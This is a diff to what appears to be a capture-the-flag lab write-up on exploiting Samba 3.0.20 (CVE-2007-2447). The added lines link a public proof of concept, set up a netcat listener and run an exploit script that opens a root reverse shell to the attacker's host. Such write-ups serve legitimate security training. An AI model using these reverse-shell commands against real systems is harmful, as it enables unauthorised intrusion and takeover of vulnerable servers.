@@ -65,10 +65,16 @@ Host script results:
 |_  message_signing: disabled (dangerous, but default)
 ```
 
+If we do a bit of googling on Samba 3.0.20 we can find a CVE along with a PoC for that CVE
+https://github.com/0xKn/CVE-2007-2447?tab=readme-ov-file
+
+What we need to do:
 
 set up netcat  
 nc -lvnp 4444
 
+
+python usermap_script.py 10.10.10.3  139 <LHOST> 4444
 
 We can use the CVE to get a shell that is root where we can directly read user and root flag
 
